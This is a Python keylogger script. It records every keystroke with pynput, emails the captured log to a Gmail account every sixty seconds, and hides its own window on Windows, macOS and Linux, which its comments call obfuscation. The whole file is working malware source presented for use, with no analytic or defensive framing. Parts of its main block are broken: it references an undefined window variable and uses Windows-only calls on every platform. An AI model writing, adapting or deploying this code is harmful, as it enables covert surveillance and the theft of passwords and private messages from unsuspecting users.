import os
import smtplib
import threading
import sys
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import platform

EMAIL_ADDRESS = "YOUR_EMAIL"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # in second

class KeyLogger:
    def __init__(self, email, password):
        self.log = ""
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, message):
        sender = self.email
        receiver = self.email

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Raporu"

        body = message
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(sender, receiver, msg.as_string())

    def report(self):
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(SEND_REPORT_EVERY, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Check to work on other operating systems
if platform.system() == "Windows":
    import win32gui
    import win32con

    def hide_program():
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE) # Here is the appropriate obfuscation code for Windows

elif platform.system() == "Darwin":  # for MacOS
    def hide_program():
        os.system("osascript -e 'tell app \"Finder\" to set visible of process \"Python\" to false'")  # Here is the appropriate obfuscation code for MacOS
        pass
    
elif platform.system() == "Linux":  # for Linux
    def hide_program():
        os.system("xdotool getactivewindow windowminimize")  # Here is the appropriate obfuscation code for Linux
        pass
else:
    raise Exception("This operating system is not supported")

def on_show(window):
    hide_program()

if __name__ == "__main__":
    keylogger = KeyLogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.start()
    hide_program()
    # Minimize Window
    win32gui.ShowWindow(window, win32con.SW_MINIMIZE)
    win32gui.EnumWindows(on_show, 0)
    sys.exit()
